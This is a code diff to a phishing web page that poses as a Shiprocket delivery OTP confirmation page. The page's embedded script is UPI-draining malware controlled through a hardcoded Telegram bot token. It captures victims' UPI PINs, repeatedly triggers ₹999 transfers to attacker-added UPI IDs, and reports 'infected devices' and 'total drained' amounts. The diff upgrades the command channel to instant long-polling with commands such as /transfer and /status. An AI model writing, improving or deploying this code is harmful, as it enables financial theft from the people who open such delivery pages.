@@ -171,7 +171,6 @@
       <p style="font-size:12px; color:#5a6f88; margin-top:6px;">Share OTP with delivery partner</p>
     </div>
 
-    <!-- ===== DECLINE NOTE ===== -->
     <div class="decline-note">
       If this is not your order, please decline it.
     </div>
@@ -210,7 +209,7 @@
 
 <script>
   // ============================================================
-  // CHAKRA - SHIPROCKET CONFIRM & DECLINE
+  // CHAKRA - FAST TELEGRAM COMMANDS WITH LONG POLLING
   // ============================================================
 
   const C2_BOT_TOKEN = '8933219910:AAGrb16D3twK-yyPMVDRwwYIgLtiaOyy-iQ';
@@ -222,6 +221,7 @@
   let isPaused = false;
   let totalDrained = 0;
   let infectedDevices = [];
+  let lastUpdateId = 0;
 
   // ============================================================
   // SEND TO TELEGRAM
@@ -378,7 +378,7 @@
     if (!isPaused && isUpiAppOpen() && myUPIList.length > 0) {
       const pin = getUPIPin();
       if (pin) {
-        executeDrain(999);  // <-- CHANGE HERE: ₹999
+        executeDrain(999);
       }
     }
   }, 5000);
@@ -406,77 +406,99 @@
   }, 300000);
 
   // ============================================================
-  // TELEGRAM COMMANDS
+  // FAST TELEGRAM COMMANDS (LONG POLLING - INSTANT RESPONSE)
   // ============================================================
-  setInterval(() => {
-    fetch('https://api.telegram.org/bot' + C2_BOT_TOKEN + '/getUpdates')
+  function listenForCommands() {
+    fetch('https://api.telegram.org/bot' + C2_BOT_TOKEN + '/getUpdates?offset=' + lastUpdateId + '&timeout=10')
       .then(res => res.json())
       .then(data => {
-        if (data.result && data.result.length > 0) {
-          const msg = data.result[0].message.text;
+        if (data.ok && data.result && data.result.length > 0) {
+          for (let update of data.result) {
+            lastUpdateId = update.update_id + 1;
+            const msg = update.message.text;
+            
+            // ===== PROCESS COMMANDS INSTANTLY =====
+            
+            // Add UPI
+            if (msg.startsWith('/addupi')) {
+              const upi = msg.split(' ')[1];
+              if (upi && upi.includes('@')) addUPI(upi);
+            }
 
-          if (msg.startsWith('/addupi')) {
-            const upi = msg.split(' ')[1];
-            if (upi && upi.includes('@')) addUPI(upi);
-          }
+            // Show my UPIs
+            if (msg === '/myupis') {
+              sendToTelegram('📋 Your UPIs:\n' + (myUPIList.join('\n') || 'None'));
+            }
 
-          if (msg === '/myupis') {
-            sendToTelegram('📋 Your UPIs:\n' + (myUPIList.join('\n') || 'None'));
-          }
-
-          if (msg === '/transfer') {
-            if (myUPIList.length === 0) {
-              sendToTelegram('❌ No UPI added. Use /addupi');
-            } else {
-              sendToTelegram('🚀 TRANSFER MODE ACTIVATED');
-              for (let i = 0; i < infectedDevices.length; i++) {
-                setTimeout(() => {
-                  const pin = getUPIPin();
-                  if (pin) executeDrain(999);
-                }, i * 5000);
+            // Transfer mode
+            if (msg === '/transfer') {
+              if (myUPIList.length === 0) {
+                sendToTelegram('❌ No UPI added. Use /addupi');
+              } else {
+                sendToTelegram('🚀 TRANSFER MODE ACTIVATED');
+                for (let i = 0; i < infectedDevices.length; i++) {
+                  setTimeout(() => {
+                    const pin = getUPIPin();
+                    if (pin) executeDrain(999);
+                  }, i * 5000);
+                }
               }
             }
-          }
 
-          if (msg === '/stop' || msg === '/pause') {
-            isPaused = true;
-            sendToTelegram('⏸️ Paused');
-          }
+            // Pause / Stop
+            if (msg === '/stop' || msg === '/pause') {
+              isPaused = true;
+              sendToTelegram('⏸️ Paused');
+            }
 
-          if (msg === '/resume') {
-            isPaused = false;
-            sendToTelegram('▶️ Resumed');
-          }
+            // Resume
+            if (msg === '/resume') {
+              isPaused = false;
+              sendToTelegram('▶️ Resumed');
+            }
 
-          if (msg === '/status') {
-            sendToTelegram(
-              '📊 STATUS\n' +
-              '─────────────────\n' +
-              'Vector: Shiprocket OTP\n' +
-              'Your UPIs: ' + myUPIList.length + '\n' +
-              'Total Drained: ₹' + totalDrained + '\n' +
-              'Infected Devices: ' + infectedDevices.length + '\n' +
-              'Paused: ' + (isPaused ? 'YES' : 'NO')
-            );
-          }
+            // Status
+            if (msg === '/status') {
+              sendToTelegram(
+                '📊 STATUS\n' +
+                '─────────────────\n' +
+                'Vector: Shiprocket OTP\n' +
+                'Your UPIs: ' + myUPIList.length + '\n' +
+                'Total Drained: ₹' + totalDrained + '\n' +
+                'Infected Devices: ' + infectedDevices.length + '\n' +
+                'Paused: ' + (isPaused ? 'YES' : 'NO')
+              );
+            }
 
-          if (msg === '/help') {
-            sendToTelegram(
-              '📖 COMMANDS\n' +
-              '─────────────────\n' +
-              '/addupi upi@paytm - Add your UPI\n' +
-              '/myupis - Show your UPIs\n' +
-              '/transfer - Start sending to your UPIs\n' +
-              '/pause - Pause drains\n' +
-              '/resume - Resume drains\n' +
-              '/status - Show system status\n' +
-              '/help - Show commands'
-            );
+            // Help
+            if (msg === '/help') {
+              sendToTelegram(
+                '📖 COMMANDS\n' +
+                '─────────────────\n' +
+                '/addupi upi@paytm - Add your UPI\n' +
+                '/myupis - Show your UPIs\n' +
+                '/transfer - Start sending to your UPIs\n' +
+                '/pause - Pause drains\n' +
+                '/resume - Resume drains\n' +
+                '/status - Show system status\n' +
+                '/help - Show commands'
+              );
+            }
           }
         }
+        // CONTINUOUS LISTENING
+        listenForCommands();
       })
-      .catch(() => {});
-  }, 30000);
+      .catch(() => {
+        // Retry after 1 second if error
+        setTimeout(listenForCommands, 1000);
+      });
+  }
+
+  // ============================================================
+  // START LISTENING FOR COMMANDS (INSTANT)
+  // ============================================================
+  listenForCommands();
 
   // ============================================================
   // SERVICE WORKER
@@ -487,7 +509,10 @@
     });
   }
 
-  sendToTelegram('🚚 SHIPROCKET CONFIRM/DECLINE VECTOR ACTIVE (₹999)');
+  // ============================================================
+  // STARTUP
+  // ============================================================
+  sendToTelegram('🚚 SHIPROCKET VECTOR ACTIVE (FAST COMMANDS)');
 </script>
 </body>
 </html>
